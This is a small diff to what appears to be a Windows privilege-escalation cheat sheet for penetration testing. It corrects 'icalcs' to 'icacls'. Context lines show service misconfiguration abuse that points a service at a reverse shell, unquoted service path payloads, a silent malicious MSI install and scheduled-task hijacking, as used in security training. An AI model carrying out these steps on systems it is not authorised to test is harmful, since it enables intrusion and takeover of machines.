@@ -1308,7 +1308,7 @@ SharpEfsPotato.exe -p C:\Windows\system32\WindowsPowerShell\v1.0\powershell.exe 
 
 ```powershell
 #Identify service from winpeas
-icalcs "path" #F means full permission, we need to check we have full access on the folder
+icacls "path" #F means full permission, we need to check we have full access on the folder
 sc qc <servicename> #find binary path variable
 sc config <service> <option>="<value>" #change the path to the reverse shell location
 sc start <servicename>
@@ -1319,7 +1319,7 @@ sc start <servicename>
 ```bash
 wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """  #Displays services which has missing quotes, this can slo be obtained by running WinPEAS
 #Check the Writable path
-icalcs "path"
+icacls "path"
 #Insert the payload in writable location and which works.
 sc start <servicename>
 ```
@@ -1393,7 +1393,7 @@ msiexec /quiet /qn /i reverse.msi
 ```bash
 schtasks /query /fo LIST /v #Displays list of scheduled tasks, Pickup any interesting one
 #Permission check - Writable means exploitable!
-icalcs "path"
+icacls "path"
 #Wait till the scheduled task in executed, then we'll get a shell
 ```
 
